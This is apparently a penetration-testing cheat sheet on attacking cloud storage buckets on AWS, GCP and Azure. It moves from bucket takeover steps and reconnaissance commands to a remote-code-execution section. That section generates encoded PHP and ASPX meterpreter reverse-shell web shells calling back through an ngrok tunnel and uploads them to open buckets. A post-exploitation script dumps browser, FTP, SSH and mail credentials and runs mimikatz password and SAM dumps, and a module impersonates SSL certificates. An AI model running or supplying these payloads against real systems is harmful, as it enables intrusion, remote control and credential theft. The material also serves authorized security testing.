# Cloud Storage

## Check List

* [ ] Assess that the access control configuration for the storage services is properly in place.

## Cheat Sheet

### Methodology

{% stepper %}
{% step %}
Cloud Storage (AWS S3)
{% endstep %}

{% step %}
Go to AWS S3 console Create a new bucket with the **exact name** matching the vulnerable/unclaimed bucket
{% endstep %}

{% step %}
Complete the bucket creation process Upload a proof-of-concept file (HTML or TXT file) Set the uploaded file’s permissions to public read
{% endstep %}

{% step %}
Add proper metadata (`Content-Type: text/html if HTML file`) (Optional) Enable static website hosting on the bucket and set the uploaded file as the index document The attacker now controls the bucket and can serve malicious content
{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}
Cloud Storage (S3)
{% endstep %}

{% step %}
So I get all the alive subdomains use Subdomain Enum Command in cheat sheet&#x20;
{% endstep %}

{% step %}
So I put every single alive domain in browser let call it Target example `https://$WEBSITE/` so after this I put `/%C0` → say `https://$WEBSITE/%C0`&#x20;
{% endstep %}

{% step %}
.And I notice that it give me an cloudflare error like this `InvalidURI` Couldn’t parse the specified URI /%C0 So I just append the target domain with .s3.amazonaws.com `https://$WEBSITE.s3.amazonaws.com/`
{% endstep %}

{% step %}
And I get the bucket name. Some time it says no such bucket. So in that case what I do I just run dig on that Command
{% endstep %}

{% step %}
So it gives CNAME of pointed (`http://$WEBSITE`) so I am thinking what to do with this. So I read this article But unluckily on CRUD operation I get access denied and use .aws s3 Commands And in response I have foun `PRE Server/`
{% endstep %}
{% endstepper %}

***

### WHOIS Lookup

#### [Host](https://linux.die.net/man/1/host)

{% hint style="info" %}
Domain to IP
{% endhint %}

```bash
host $WEBSITE
```

#### [Whois](https://who.is)

{% hint style="info" %}
Company Info
{% endhint %}

```bash
whois $WEBSITE
```

{% hint style="info" %}
IP to ASN
{% endhint %}

```bash
whois -h whois.cymru.com -v $TARGET
```

#### [cURL](https://curl.se/)

{% hint style="info" %}
HTTP Headers
{% endhint %}

```bash
curl -I $WEBSITE
```

{% hint style="info" %}
Check Robots
{% endhint %}

```bash
curl $WEBSITE/robots.txt
```

### DNS Enum

#### [DNSEnum](https://github.com/fwaeytens/dnsenum)

{% hint style="info" %}
DNS Records
{% endhint %}

```bash
dnsenum $WEBSITE
```

#### [Dig](https://linux.die.net/man/1/dig)

```bash
dig +short $WEBSITE
```

### Subdomain Enum

#### [SubFinder ](https://github.com/projectdiscovery/subfinder)& [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)

{% hint style="info" %}
Subdomains
{% endhint %}

```bash
echo "1.1.1.1" > /tmp/resolvers.txt; \
subfinder -d $WEBSITE -all | \
shuffledns -d $WEBSITE -r /tmp/resolvers.txt -mode resolve
```

### Source URLs

#### [Katana](https://github.com/projectdiscovery/katana)

{% hint style="info" %}
GCP
{% endhint %}

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+storage\.googleapis\.com[^ ]*"
```

{% hint style="info" %}
AWS
{% endhint %}

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.amazonaws\.com"
```

{% hint style="info" %}
Azure
{% endhint %}

```bash
katana -u $WEBSITE -jc -d 5 | grep -Eo "https?://[^ ]+s3[^ ]+\.blob.core.windows\.net"
```

### Certificate Transparency

#### [Cert.sh](https://crt.sh)

```bash
curl -s "https://crt.sh/?q=%25.$WEBSITE&output=json" | jq .
```

### [Wayback Machine](https://web.archive.org/)

{% hint style="info" %}
GCP
{% endhint %}

```bash
echo $WEBSITE | gau | grep -E "storage\.googleapis\.com|.*\.storage.googleapis.com"
```

{% hint style="info" %}
AWS
{% endhint %}

```bash
echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.amazonaws\.com|s3\.amazonaws\.com"
```

{% hint style="info" %}
Azure
{% endhint %}

```bash
echo $WEBSITE | gau | grep -E "s3\.[a-z0-9-]+\.blob.core.windows\.net|s3\.blob.core.windows\.net"
```

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
GCP
{% endhint %}

```bash
nmap -p 80,443 \
     --script http-title,http-headers $BUCKET.storage.googleapis.com
```

{% hint style="info" %}
AWS
{% endhint %}

```bash
nmap -p 80,443 \
     --script http-title,s3open $BUCKET.s3.amazonaws.com
```

{% hint style="info" %}
Azure
{% endhint %}

```bash
nmap -p 80,443 \
     --script http-title,azure-enum $CONTAINER.blob.core.windows.net
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei)

```bash
nuclei -u $WEBSITE \
       -tags aws gcp azure cloud cloud-Enum aws-cloud-config azure-cloud-config 
```

### **Open Source Intelligence**

#### [Google](https://www.google.com/)

{% hint style="info" %}
[GCP](https://cloud.google.com)
{% endhint %}

```bash
site:$WEBSITE inurl:"storage.googleapis.com" | 
site:$WEBSITE inurl:"googleusercontent.com"
```

{% hint style="info" %}
[AWS](https://aws.amazon.com)
{% endhint %}

```bash
site:$WEBSITE inurl:"amazonaws.com" | 
site:s3.amazonaws.com $WEBSITE
```

{% hint style="info" %}
[Azure](https://azure.microsoft.com)
{% endhint %}

```bash
site:$WEBSITE inurl:"blob.core.windows.com" | 
site:blob.core.windows.com $WEBSITE
```

#### [Shodan](https://www.shodan.io/)

```bash
shodan search net:"$TARGET/24"
```

#### [Censys](https://search.censys.io/)

```bash
services.http.response.body: {"s3.amazonaws.com", "storage.googleapis.com", "blob.core.windows.net"}
```

#### [CloudBrute](https://github.com/0xsha/CloudBrute)

{% hint style="info" %}
GCP
{% endhint %}

```bash
wget https://raw.githubusercontent.com/RhinoSecurityLabs/GCPBucketBrute/refs/heads/master/permutations.txt \
    -O /tmp/gcp_buckets.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "gcp" \
    -w /tmp/gcp_buckets.txt
```

{% hint style="info" %}
AWS
{% endhint %}

```bash
wget https://raw.githubusercontent.com/koaj/aws-s3-bucket-wordlist/refs/heads/master/list.txt \
    -O /tmp/s3_bucket_list.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "s3" \
    -w /tmp/s3_bucket_list.txt
```

{% hint style="info" %}
Azure
{% endhint %}

```bash
wget https://raw.githubusercontent.com/Macmod/goblob/refs/heads/main/wordlists/goblob-folder-names.txt \
    -O /tmp/AzureBlob.txt
cloudbrute discover \
    -d $WEBSITE \
    -k "azure" \
    -w /tmp/AzureBlob.txt
```

#### [Nmap](https://nmap.org/)

```bash
nmap -p 80,443 \
     --script http-title,http-open-proxy,ssl-cert,http-enum,http-robots.txt,http-auth-finder,s3-buckets,s3-ls,s3-object,s3-enum,s3-brute \
     $CONTAINER.blob.core.windows.net \
     $BUCKET.storage.googleapis.com \
     $BUCKET.s3.amazonaws.com
```

### Remote Code Execution

#### [**Weevely**](https://github.com/epinna/weevely3)

{% hint style="info" %}
Create Web Shell PHP
{% endhint %}

```bash
weevely generate 00980098 /tmp/unk9vvn.php
```

{% hint style="info" %}
Create Web Shell ASPX
{% endhint %}

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
```

#### [**Metasploit**](https://www.metasploit.com/)

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
ngrok tcp 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

{% hint style="info" %}
Cert Spoof
{% endhint %}

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

{% hint style="info" %}
Post-EXP
{% endhint %}

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

{% hint style="info" %}
Generate Web shell PHP
{% endhint %}

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 \
         -i 3 \
         -o /tmp/unk9vvn.php
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

{% hint style="info" %}
Generate Web Shell ASP
{% endhint %}

```bash
msfvenom -p windows/meterpreter/reverse_winhttps \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f asp > /tmp/unk9vvn.aspx
```

{% hint style="info" %}
Listening Metasploit PHP
{% endhint %}

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Listening Metaploit ASP
{% endhint %}

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD windows/meterpreter/reverse_winhttps;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

#### [**AWS S3**](https://aws.amazon.com/)

{% hint style="info" %}
Connection Test
{% endhint %}

```bash
aws s3 ls s3://$BUCKET.s3.amazonaws.com --no-sign-request
```

{% hint style="info" %}
Upload File Testing
{% endhint %}

```bash
aws s3 cp /tmp/unk9vvn.php s3://$BUCKET.s3.amazonaws.com --no-sign-request
```

{% hint style="info" %}
Success Upload File Testing
{% endhint %}

```bash
aws s3 cp s3://$BUCKET.s3.amazonaws.com/unk9vvn.php . --no-sign-request
```

{% hint style="info" %}
HTTP Connection Testing
{% endhint %}

```bash
curl -I https://$BUCKET.s3.amazonaws.com/unk9vvn.php
```

#### [GCP](https://cloud.google.com)

{% hint style="info" %}
Connection Test
{% endhint %}

```bash
gsutil ls gs://$BUCKET
```

{% hint style="info" %}
Upload File Testing
{% endhint %}

```bash
gsutil cp /tmp/unk9vvn.php gs://$BUCKET
```

{% hint style="info" %}
Success Upload File Testing
{% endhint %}

```bash
gsutil cp gs://$BUCKET/unk9vvn.php .
```

{% hint style="info" %}
HTTP Connection Testing
{% endhint %}

```bash
curl -I http://storage.googleapis.com/$BUCKET/unk9vvn.php
```

#### [Azure](https://azure.microsoft.com)

{% hint style="info" %}
Connection Test
{% endhint %}

```bash
az storage blob list \
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --output table
```

{% hint style="info" %}
Upload File Testing
{% endhint %}

```bash
az storage blob upload \
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --name unk9vvn.aspx \
    --file /tmp/unk9vvn.aspx \
    --auth-mode login
```

{% hint style="info" %}
Success Upload File Testing
{% endhint %}

```bash
az storage blob download 
    --account-name $ACCOUNT \
    --container-name $CONTAINER \
    --name unk9vvn.aspx \
    --file /tmp/test_unk9vvn.aspx \
    --auth-mode login
```

{% hint style="info" %}
HTTP Connection Testing
{% endhint %}

```bash
curl -I https://$ACCOUNT.blob.core.windows.net/$CONTAINER/unk9vvn.aspx
```
